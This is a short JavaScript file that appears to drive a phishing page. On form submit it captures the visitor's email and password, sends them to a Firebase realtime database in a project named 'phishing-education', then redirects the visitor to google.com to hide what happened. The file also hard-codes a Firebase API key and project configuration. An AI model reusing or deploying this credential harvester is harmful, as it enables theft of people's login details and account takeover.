// Initialize Firebase (ADD YOUR OWN DATA)
const config = {
    apiKey: "AIzaSyCF0LObwi_DDiRiH2_tFgCmeeK-A_60AJM",
    authDomain: "phishing-education.firebaseapp.com",
    databaseURL: "https://phishing-education-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "phishing-education",
    storageBucket: "phishing-education.appspot.com",
    messagingSenderId: "414019752449",
    appId: "1:414019752449:web:ba616f3321f72f64bfe600"
  };
  firebase.initializeApp(config);
  
  // Reference messages collection
  var messagesRef = firebase.database().ref('messages');
  
  // Listen for form submit
  document.getElementById('contactForm').addEventListener('submit', submitForm);
  
  // Submit form
  function submitForm(e){
      console.log(e)
    e.preventDefault();
  
    // Get values
    var email = getInputVal('email');
    var pass = getInputVal('pass');
  
    // Save message
    saveMessage(email, pass);
  
    // Show alert
    // document.querySelector('.alert').style.display = 'block';
  
    // Hide alert after 3 seconds
    // setTimeout(function(){
    //   document.querySelector('.alert').style.display = 'none';
    // },3000);
  
    // Clear form
    document.getElementById('contactForm').reset();
  }
  
  // Function to get get form values
  function getInputVal(id){
    return document.getElementById(id).value;
  }
  
  // Save message to firebase
  function saveMessage(email, pass){
    // var newMessageRef = messagesRef.push();
    // newMessageRef.set({
    //   email:email,
    //   pass:pass
    // });
    const newData = messagesRef.child('messages');
    let data = {};
    data.email = email;
    data.pass = pass;
    newData.push(data).then(e => console.log(e));
    window.location.replace("http://google.com");

  }